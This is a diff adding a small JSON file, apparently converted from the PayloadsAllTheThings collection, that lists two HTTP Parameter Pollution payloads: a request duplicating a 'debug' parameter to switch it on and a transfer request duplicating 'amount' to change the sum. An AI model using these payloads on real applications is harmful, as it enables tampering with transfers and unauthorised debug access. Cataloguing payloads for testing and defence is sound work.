@@ -1,0 +1,16 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "hpp",
+  "original_category": "HTTP Parameter Pollution",
+  "payloads": [
+    {
+      "category": "Methodology",
+      "escalation": "baseline",
+      "lines": [
+        "/app?debug=false&debug=true",
+        "/transfer?amount=1&amount=5000"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.870Z"
+}
